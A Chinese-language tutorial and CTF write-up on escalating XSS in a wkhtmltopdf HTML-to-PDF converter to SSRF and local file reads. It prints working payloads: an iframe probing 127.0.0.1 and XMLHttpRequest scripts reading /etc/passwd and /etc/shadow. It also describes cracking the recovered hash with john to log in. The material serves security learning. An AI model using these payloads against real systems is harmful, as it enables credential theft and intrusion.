❗[实战 | XSS到任意文件读取 | CN-SEC 中文网](https://cn-sec.com/archives/2044507.html)

[PDF解析器html/XSS 实现SSRF - 火线 Zone-安全攻防社区](https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf)

# XSS到任意文件读取

xss一直是一种非常常见且具有威胁性的攻击方式。然而，除了可能导致用户受到恶意脚本的攻击外，xss在特定条件下还会造成ssrf和文件读取，本文主要讲述在一次漏洞挖掘过程中从xss到文件读取的过程，以及其造成的成因。

#### 1.XSS

测试：

```
<script>alert(1)</script>
```

看网页是否有对应回显，有则说明存在XSS

然后使用`<h1>`标签测试，如果发现h1标签也会被解析

```
<p><h1>test1</h1>test2</p>
```

然后我们发现，网站有一个功能可以把简历转成**pdf**并下载，而在线编辑的是**html**格式，而且这一转换过程是在后端完成，并且导出的pdf中标签依然是被解析的，如下图所示，导出的pdf中上方的字体也明显变大，说明h1标签被解析

#### 2.SSRF

通过过滤网络请求我们发现这样一个数据包，它将html及里面包含的js代码会发送给后端，后端可能通过渲染html代码从而生成pdf供用户下载

一般可以通过获取后端解析的组件及版本来获取更多信息，从下载的pdf中，可以文件的头部信息可以获取创建者或者pdf文件信息

发现后端使用的[wkhtmltopdf](https://cn-sec.com/archives/tag/wkhtmltopdf)组件(wkhtmltopdf：Html转pdf的工具)

wkhtmltopdf官方文档：https://wkhtmltopdf.org/index.html

在他的使用文档中发现其使用`Qt WebKit`浏览器引擎将html渲染成pdf，既然是通过浏览器渲染的，那html中的所有标签也会被浏览器所执行。

所以我们使用`iframe`标签尝试读取内网资源

```
<iframe src="http://127.0.0.1" width="500" height="100">
```

#### 3.任意文件读取

我们尝试是否能通过请求file协议读取文件

javascript 将在服务器端执行，让我们尝试通过注入以下 javascript 从文件系统中获取文件，然后构造payload进行文件的读取：

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open('GET','file:///etc/passwd');//或file:///etc/shadow
x.send();
</script>
```

通过XMLHttpRequest发起请求，使用file协议读取本地文件，然后document.write将请求的结果覆盖原来html的内容。

再访问pdf，成功读取到文件

## 例题：[极客大挑战2025_web]PDF Viewer

html转pdf

![img](http://www.kdocs.cn/api/v3/office/copy/eW84cnQvZSsrVjN1cmpUcWFKVFEvbGtJM0R1d3hWMjlUSHRjR1o2UjYvNUhEN0hGKy9sVjFBUm1Jb1ZBOGk3MDZ0c1hlREszblpPSXVDY0dtZmRFelYvcmcvc3ZZL3lyTUtYRHk3ellXeGJXUWQyc09PS3hKNXBSZVIxb3pmZ0VYdjNURGJsTXpYOUhjTktNay9RT1lpMElmcjBFeUJhamZaNTRRblRKMlhUWnRCdGFDaG5rN0grTjhlZUErUWlnWFFxeVBaRzZEeXptcUtsRk1IZnBkSExYUk5PSXdhdEwvdFplTG9vMzdReEROSWhBOFBDLys5Rzk3RTNoRmx5MEdxVm1oUzJUTllBPQ==/attach/object/CNV5QGBEACAH4?)

![img](http://www.kdocs.cn/api/v3/office/copy/eW84cnQvZSsrVjN1cmpUcWFKVFEvbGtJM0R1d3hWMjlUSHRjR1o2UjYvNUhEN0hGKy9sVjFBUm1Jb1ZBOGk3MDZ0c1hlREszblpPSXVDY0dtZmRFelYvcmcvc3ZZL3lyTUtYRHk3ellXeGJXUWQyc09PS3hKNXBSZVIxb3pmZ0VYdjNURGJsTXpYOUhjTktNay9RT1lpMElmcjBFeUJhamZaNTRRblRKMlhUWnRCdGFDaG5rN0grTjhlZUErUWlnWFFxeVBaRzZEeXptcUtsRk1IZnBkSExYUk5PSXdhdEwvdFplTG9vMzdReEROSWhBOFBDLys5Rzk3RTNoRmx5MEdxVm1oUzJUTllBPQ==/attach/object/2DANQGBEACAAU?)

将链接换成自己的服务器ip

![img](http://www.kdocs.cn/api/v3/office/copy/eW84cnQvZSsrVjN1cmpUcWFKVFEvbGtJM0R1d3hWMjlUSHRjR1o2UjYvNUhEN0hGKy9sVjFBUm1Jb1ZBOGk3MDZ0c1hlREszblpPSXVDY0dtZmRFelYvcmcvc3ZZL3lyTUtYRHk3ellXeGJXUWQyc09PS3hKNXBSZVIxb3pmZ0VYdjNURGJsTXpYOUhjTktNay9RT1lpMElmcjBFeUJhamZaNTRRblRKMlhUWnRCdGFDaG5rN0grTjhlZUErUWlnWFFxeVBaRzZEeXptcUtsRk1IZnBkSExYUk5PSXdhdEwvdFplTG9vMzdReEROSWhBOFBDLys5Rzk3RTNoRmx5MEdxVm1oUzJUTllBPQ==/attach/object/HA3DEGJEACQBW?)

![img](http://www.kdocs.cn/api/v3/office/copy/eW84cnQvZSsrVjN1cmpUcWFKVFEvbGtJM0R1d3hWMjlUSHRjR1o2UjYvNUhEN0hGKy9sVjFBUm1Jb1ZBOGk3MDZ0c1hlREszblpPSXVDY0dtZmRFelYvcmcvc3ZZL3lyTUtYRHk3ellXeGJXUWQyc09PS3hKNXBSZVIxb3pmZ0VYdjNURGJsTXpYOUhjTktNay9RT1lpMElmcjBFeUJhamZaNTRRblRKMlhUWnRCdGFDaG5rN0grTjhlZUErUWlnWFFxeVBaRzZEeXptcUtsRk1IZnBkSExYUk5PSXdhdEwvdFplTG9vMzdReEROSWhBOFBDLys5Rzk3RTNoRmx5MEdxVm1oUzJUTllBPQ==/attach/object/IMEDIGJEADQAA?)

发现一个叫wkhtmltopdf的东西（wkhtmltopdf：***\*Html转pdf的工具\****）

[实战 | XSS到任意文件读取 | CN-SEC 中文网](https://cn-sec.com/archives/2044507.html)

[PDF解析器html/XSS 实现SSRF - 火线 Zone-安全攻防社区](https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf)

payload:读取/etc/shadow

```
<h1>blahblah</h1>
 <script>
 x=new XMLHttpRequest;
 x.onload=function(){document.write(this.responseText)};
 x.open('GET','file:///etc/shadow');
 x.send();
 </script>
```

![img](http://www.kdocs.cn/api/v3/office/copy/eW84cnQvZSsrVjN1cmpUcWFKVFEvbGtJM0R1d3hWMjlUSHRjR1o2UjYvNUhEN0hGKy9sVjFBUm1Jb1ZBOGk3MDZ0c1hlREszblpPSXVDY0dtZmRFelYvcmcvc3ZZL3lyTUtYRHk3ellXeGJXUWQyc09PS3hKNXBSZVIxb3pmZ0VYdjNURGJsTXpYOUhjTktNay9RT1lpMElmcjBFeUJhamZaNTRRblRKMlhUWnRCdGFDaG5rN0grTjhlZUErUWlnWFFxeVBaRzZEeXptcUtsRk1IZnBkSExYUk5PSXdhdEwvdFplTG9vMzdReEROSWhBOFBDLys5Rzk3RTNoRmx5MEdxVm1oUzJUTllBPQ==/attach/object/DNH7CGBEADQCO?)

![img](http://www.kdocs.cn/api/v3/office/copy/eW84cnQvZSsrVjN1cmpUcWFKVFEvbGtJM0R1d3hWMjlUSHRjR1o2UjYvNUhEN0hGKy9sVjFBUm1Jb1ZBOGk3MDZ0c1hlREszblpPSXVDY0dtZmRFelYvcmcvc3ZZL3lyTUtYRHk3ellXeGJXUWQyc09PS3hKNXBSZVIxb3pmZ0VYdjNURGJsTXpYOUhjTktNay9RT1lpMElmcjBFeUJhamZaNTRRblRKMlhUWnRCdGFDaG5rN0grTjhlZUErUWlnWFFxeVBaRzZEeXptcUtsRk1IZnBkSExYUk5PSXdhdEwvdFplTG9vMzdReEROSWhBOFBDLys5Rzk3RTNoRmx5MEdxVm1oUzJUTllBPQ==/attach/object/3ETPCGBEACAH6?)

john破解密码：qwerty     (WeakPassword_Admin)  

![img](http://www.kdocs.cn/api/v3/office/copy/eW84cnQvZSsrVjN1cmpUcWFKVFEvbGtJM0R1d3hWMjlUSHRjR1o2UjYvNUhEN0hGKy9sVjFBUm1Jb1ZBOGk3MDZ0c1hlREszblpPSXVDY0dtZmRFelYvcmcvc3ZZL3lyTUtYRHk3ellXeGJXUWQyc09PS3hKNXBSZVIxb3pmZ0VYdjNURGJsTXpYOUhjTktNay9RT1lpMElmcjBFeUJhamZaNTRRblRKMlhUWnRCdGFDaG5rN0grTjhlZUErUWlnWFFxeVBaRzZEeXptcUtsRk1IZnBkSExYUk5PSXdhdEwvdFplTG9vMzdReEROSWhBOFBDLys5Rzk3RTNoRmx5MEdxVm1oUzJUTllBPQ==/attach/object/MTRPAGBEACADM?)

输入用户名和密码

![img](http://www.kdocs.cn/api/v3/office/copy/eW84cnQvZSsrVjN1cmpUcWFKVFEvbGtJM0R1d3hWMjlUSHRjR1o2UjYvNUhEN0hGKy9sVjFBUm1Jb1ZBOGk3MDZ0c1hlREszblpPSXVDY0dtZmRFelYvcmcvc3ZZL3lyTUtYRHk3ellXeGJXUWQyc09PS3hKNXBSZVIxb3pmZ0VYdjNURGJsTXpYOUhjTktNay9RT1lpMElmcjBFeUJhamZaNTRRblRKMlhUWnRCdGFDaG5rN0grTjhlZUErUWlnWFFxeVBaRzZEeXptcUtsRk1IZnBkSExYUk5PSXdhdEwvdFplTG9vMzdReEROSWhBOFBDLys5Rzk3RTNoRmx5MEdxVm1oUzJUTllBPQ==/attach/object/F25PIGBEAAACQ?)



